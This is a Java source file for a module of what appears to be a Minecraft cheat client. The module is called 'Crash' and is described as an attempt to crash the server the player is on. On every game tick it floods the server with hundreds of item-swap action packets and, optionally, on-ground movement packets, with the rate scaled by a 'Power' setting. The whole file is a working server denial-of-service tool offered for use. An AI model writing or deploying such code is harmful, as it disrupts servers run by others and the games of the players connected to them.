package acme.critical.module.misc;

import acme.critical.module.Mod;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import acme.critical.module.settings.BooleanSetting;
import acme.critical.module.settings.NumberSetting;
import acme.critical.module.settings.KeybindSetting;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action;

public class Crash extends Mod {
    private NumberSetting power = new NumberSetting("Power", 0.1, 5, 0.5, 0.1);
    private BooleanSetting packets = new BooleanSetting("Packets", true);

    public Crash() {
        super("Crash", "Attempts to crash the server you are currently on.", Category.MISC);
        addSettings(power, packets, new KeybindSetting("Key", 0));
    }

    @Override
    public void onTick() {
        for (int i = 0; i < power.getValueFloat()*100; i++) {
            mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
            if (packets.isEnabled()) mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
        }
    super.onTick();
    }
}
